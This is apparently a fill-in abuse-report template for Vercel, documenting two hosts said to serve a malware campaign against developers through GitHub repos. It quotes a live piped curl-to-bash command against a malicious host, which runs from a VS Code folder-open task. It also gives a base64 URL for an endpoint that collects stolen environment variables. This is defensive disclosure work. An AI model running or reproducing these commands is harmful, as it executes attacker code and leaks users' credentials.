# Abuse report — Vercel

**Submission target:** https://vercel.com/help — search "Report abuse" or use https://vercel.com/security/abuse if available; otherwise file a support ticket categorized as *abuse / DMCA / legal*.

This file is a **copy-paste template**. Most of it (the C2 hostnames, IPs, base64 AUTH_API value, list of affected GitHub repos, the reproducible probe) is campaign-wide and already filled in — these are the actual hosts and indicators, the same for any filer in this cluster. The only bits you fill in are the URL of *which* GitHub repo you cite as evidence of the C2 references, plus your name.

### Placeholders to fill in

Placeholders appear in the body as `[descriptive label in square brackets]` — find-and-replace each one before pasting.

| Placeholder | What to put | Where to find it |
|---|---|---|
| `[reported repository URL]` | Full URL of a GitHub repo from the cluster you're citing as evidence, e.g. `https://github.com/<org>/<repo>` | The case file, or any of the cluster repos listed in the body |
| `[commit SHA]` | The full 40-char commit SHA you can permalink against on that repo | `git log -1 --format=%H` on a local clone, or the head SHA on the GitHub page |
| `[your name / handle]` | How you want the "Reported by" line to read | (yourself) |

The two C2 hostnames in this report serve **the entire ≥15-repo developer-targeting campaign** described in the companion GitHub abuse report; this filing is by nature cluster-wide, not specific to any single source repository.

1. Copy the contents of the **Subject** code block below into the ticket's subject / title field.
2. Copy the contents of the **Body** code block below into the ticket's description field. The body is written as plain text — it reads sensibly even though the support form doesn't render Markdown.

> On the rendered GitHub view of this file, hover over each `text` code block to get GitHub's click-to-copy icon — you'll get the verbatim text, not the rendered version. **Do the placeholder fill-in before pasting.**

---

## Subject

```text
Two Vercel deployments observed operating as C2 for an active developer-targeting malware campaign (≥15 GitHub repositories, "Contagious Interview" TTP cluster)
```

## Body

```text
SUMMARY

Two Vercel *.vercel.app deployments appear to be operating as command-and-control servers in an active, currently-live developer-targeting malware campaign. The campaign distributes RCE and credential-theft payloads via at least 15 GitHub repositories across three organizations and several individual accounts; both Vercel hosts are referenced directly from the malicious GitHub repositories and serve the entire cluster, not just a single source repo. A separate report has been filed with GitHub Trust & Safety covering the repository side.


FULL CASE FILE

A public, regularly-maintained case file for this campaign -- including the annotated technical analysis, machine-readable IOCs (CSV/JSON), and detection rules (YARA, Sigma, grep) -- is at:

  https://github.com/bryanchriswhite/dev-trap-dossiers


HOSTNAMES AND IPS

Host: vscode-settings-0506.vercel.app
  A records: 64.29.17.195, 216.198.79.195
  Role: stage-1 shell-payload distribution
  Endpoints: /api/settings/mac, /api/settings/linux, /api/settings/windows
  Each endpoint serves an OS-specific shell script that victims invoke via piped curl|bash, wget|sh, or curl|cmd. The pipe is configured by the in-repo .vscode/tasks.json with runOn:folderOpen, so opening one of the malicious repos in VS Code is sufficient to fetch and execute the payload silently.

Host: ip-core-api-one.vercel.app
  A records: 64.29.17.131, 216.198.79.131
  Role: stage-2 Node-loader C2 and process.env exfiltration sink
  Endpoint: POST /api
  When a victim runs "npm install" or "npm start" on one of the malicious repos, the in-repo Express server boots and POSTs the victim's entire process.env (cloud, GitHub, npm, LLM-provider, etc. tokens) to this endpoint, then executes the response body as JavaScript via new Function("require", response.data)(require) -- arbitrary Node RCE as the victim's user. The expected magic header is x-app-request: ip-check.

The two hosts resolve to ADJACENT last-octets in Vercel's edge ({64.29.17,216.198.79}.{131,195}) -- consistent with the deployments being on the same Vercel deployment slice and the same Vercel account.


EVIDENCE OF MALICIOUS USE -- referenced from malicious GitHub repositories

The two C2 hostnames are referenced directly from the malicious repositories:

- vscode-settings-0506.vercel.app is invoked from .vscode/tasks.json with runOn:folderOpen executing 'curl -L https://vscode-settings-0506.vercel.app/api/settings/mac | bash' and per-OS equivalents. Output is fully suppressed. See:
    [reported repository URL]/blob/[commit SHA]/.vscode/tasks.json

- ip-core-api-one.vercel.app is committed in .env as the value of AUTH_API, base64-encoded:
    AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
  which decodes to https://ip-core-api-one.vercel.app/api. The committed code at server/controllers/auth.js and server/routes/api/auth.js then POSTs process.env to this URL and new-Function-executes the response. See:
    [reported repository URL]/blob/[commit SHA]/.env
    [reported repository URL]/blob/[commit SHA]/server/controllers/auth.js
    [reported repository URL]/blob/[commit SHA]/server/routes/api/auth.js


DEPLOYMENT BEHAVIOR -- consistent with gated C2 rather than benign apps

When probed from any non-target IP, both hostnames return the identical custom denial:

  HTTP/2 403 Forbidden
  x-deny-reason: host_not_allowed
  content-length: 21
  content-type: text/plain

  Host not in allowlist

This response is returned from every probed path on both hosts (/, /favicon.ico, /robots.txt, /api/health, /admin, /healthz, /api/settings/linux, etc.) and is unaffected by Host: / Referer: / Origin: header spoofing -- the gate appears to be on the CLIENT IP, not the HTTP Host header. Target-IP-allowlist gating is consistent with the documented C2-targeting pattern in which the operator manually registers each victim's home IP before the interview. It is also not typical of benign Vercel applications, which generally do not implement custom client-IP allowlisting with a "host_not_allowed" deny header.

Reproducible 30-second probe (returns 403 from any non-target IP):

  $ curl -sS -I -A 'curl/8.7.1' https://vscode-settings-0506.vercel.app/api/settings/mac
  HTTP/2 403
  x-deny-reason: host_not_allowed
  content-length: 21
  content-type: text/plain


KNOWN AFFECTED GITHUB REPOSITORIES (the cluster these C2 hosts serve)

Current-generation repos:
- https://github.com/AjunaWorkHub/AjunaVerse_MVP
- https://github.com/AetSoftWorkHub/AetSoft_MVP
- https://github.com/DLabsHungary-Hub9/DLabs-Platform-MVP2
- https://github.com/roamanbuild/OnyxVerse
- https://github.com/khaleb-dev/jackpot
- https://github.com/rony1235/Jp-Soccer
- https://github.com/mspkteam/williampotter

Earlier-generation repos (same loader at a different file path; some may be on accounts whose activity profile is consistent with compromise rather than operator-control):
- https://github.com/Andrii-888/0gRollplay
- https://github.com/prahaladbelavadi/CoinLocatorDemo
- https://github.com/sky-cook/tokentradingdapp
- https://github.com/WilliamSuhosky/Property-Voting-DApp
- https://github.com/artemus-jarrett/blockchain-voting-system
- https://github.com/TechByteX/NitroGem
- https://github.com/jamesm-dev/NitroGem
- https://github.com/dappfusion/defi-real-estate
- https://github.com/InvescoHub/defi-real-estate


ADDITIONAL OBSERVATIONS (may be useful for investigation / future-iteration detection)

- The adjacent IP pairs and the bit-identical .vscode/tasks.json blob across two of the affected GitHub orgs are consistent with both deployments being on the same Vercel account.
- The deployment naming patterns -- 'vscode-settings-*.vercel.app' (shell-payload host) and 'ip-core-api-*.vercel.app' (Node-loader host) -- are consistent with the operator using a naming convention across sibling deployments. The '-0506' suffix on the shell-payload host appears date-encoded, suggesting prior deployments at other dates; the '-one' suffix on the Node-loader host implies '-two', '-three', etc.
- The deployments' access logs would carry the operator's management IPs; the request logs would carry the set of victim IPs registered on the allowlist gate. Both would be relevant forensic evidence.


REPORTED BY

[your name / handle]
```

---

## Supporting artifacts (for your reference; do not paste these into the ticket)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Companion abuse report to GitHub T&S: [`abuse-report-github.md`](./abuse-report-github.md)
